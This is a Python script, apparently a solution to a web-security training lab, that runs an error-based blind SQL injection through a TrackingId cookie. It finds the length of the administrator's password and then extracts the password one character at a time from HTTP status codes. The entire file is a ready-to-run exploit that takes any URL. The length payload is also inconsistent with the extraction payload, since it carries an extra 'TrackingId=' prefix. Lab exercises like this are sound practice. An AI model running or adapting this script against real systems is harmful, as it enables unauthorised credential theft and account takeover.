import sys
import requests
import string

def enumerate_password_length(url):
    password_length = 0
    for i in range(1, 50):
        TrackingID = f"TrackingId=abc'||(SELECT CASE WHEN LENGTH(password)={i} THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'"
        response = requests.get(url, cookies={"TrackingId": TrackingID})
        if response.status_code == 200:
            password_length = i
            break
    return password_length

def enumerate_password(url, length):
    alphanumeric_characters = string.ascii_lowercase + string.digits
    password = ""
    print("Enumerating password...")
    print("Password: ", end='')
    for i in range(1, length + 1):
        for j in alphanumeric_characters:
            TrackingID = f"abc'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{j}' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'"
            response = requests.get(url, cookies={"TrackingId": TrackingID})
            if response.status_code == 200:
                password = password + j
                print(j, end='', flush=True)
                break
    
def main():
    try:
        url = sys.argv[1]
        print("Enumerating password length... ")
        password_length = enumerate_password_length(url)
        print(f"Password length: {password_length}")
        enumerate_password(url, password_length)
        print()
    except IndexError:
        print(f"Usage: python3 {sys.argv[0]} <url> \nExample: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")


if __name__ == "__main__":
    main()
